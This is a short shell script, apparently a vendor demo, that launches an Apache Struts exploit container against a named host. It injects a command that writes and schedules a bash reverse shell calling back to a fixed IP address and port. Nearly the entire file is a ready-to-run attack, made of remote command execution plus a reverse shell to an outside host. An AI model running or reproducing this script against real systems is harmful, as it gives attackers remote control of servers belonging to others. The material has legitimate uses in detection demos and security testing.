#!/bin/sh

image=registry.deepfence.net/apache-struts-exploit:latest
host=apache-struts.deepfence.net
port=80
src_ip=138.68.247.224
src_port=8000

docker run --rm --name=apache-struts-exploit --net=host ${image} ${src_ip} http://${host}:${port}/helloworld "touch /tmp/shell.bin; echo \"bash -i >& /dev/tcp/${src_ip}/${src_port} 0>&1 &\" > /tmp/shell.bin; chmod +x /tmp/shell.bin; /tmp/shell.bin | at now"
